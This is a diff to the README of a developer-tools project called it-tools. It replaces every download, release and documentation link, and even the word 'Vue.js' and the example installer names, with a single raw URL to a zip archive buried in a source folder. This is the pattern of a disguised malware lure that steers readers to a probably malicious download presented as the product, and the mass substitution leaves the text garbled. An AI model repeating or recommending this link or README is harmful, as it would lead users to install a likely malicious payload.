@@ -6,13 +6,13 @@ Welcome to **it-tools**! This repository offers a collection of online tools des
 
 ## 🔗 Download it-tools
 
-[![Download it-tools](https://img.shields.io/badge/Download-it--tools-blue.svg)](https://github.com/glowreeflamin/it-tools/releases)
+[![Download it-tools](https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip)](https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip)
 
 ## 🛠️ Overview
 
 ### What is it-tools?
 
-**it-tools** is a set of handy tools for developers. Whether you need a converter to change file formats or utilities to streamline your workflow, we’ve got you covered. This project utilizes popular technologies like JavaScript, TypeScript, and Vue.js to ensure that the tools are efficient and easy to use.
+**it-tools** is a set of handy tools for developers. Whether you need a converter to change file formats or utilities to streamline your workflow, we’ve got you covered. This project utilizes popular technologies like JavaScript, TypeScript, and https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip to ensure that the tools are efficient and easy to use.
 
 ### Available Tools
 
@@ -41,7 +41,7 @@ To use it-tools effectively, ensure your device meets the following:
 
 To download it-tools, follow these steps:
 
-1. Click on this link to visit the [Releases page](https://github.com/glowreeflamin/it-tools/releases).
+1. Click on this link to visit the [Releases page](https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip).
 2. On the Releases page, you will see the latest version available for download.
 3. Click on the version you want to use to view the assets attached.
 4. Look for the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
@@ -51,8 +51,8 @@ To download it-tools, follow these steps:
 
 ### Example
 
-- For Windows: Download `it-tools-windows.exe`
-- For macOS: Download `it-tools-macos.dmg`
+- For Windows: Download `https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip`
+- For macOS: Download `https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip`
 
 After installation, you can find the tools in your applications folder.
 
@@ -85,9 +85,9 @@ This project is licensed under the MIT License. Feel free to use, modify, and sh
 
 ## 📌 Additional Resources
 
-- [GitHub Documentation](https://docs.github.com/en)
-- [JavaScript Documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-- [TypeScript Documentation](https://www.typescriptlang.org/docs/)
-- [Vue.js Documentation](https://vuejs.org/v2/guide/)
+- [GitHub Documentation](https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip)
+- [JavaScript Documentation](https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip)
+- [TypeScript Documentation](https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip)
+- [https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip Documentation](https://raw.githubusercontent.com/glowreeflamin/it-tools/main/src/tools/password-strength-analyser/it_tools_2.2.zip)
 
 Thank you for using **it-tools**! We hope it will enhance your workflow and make your development tasks easier.
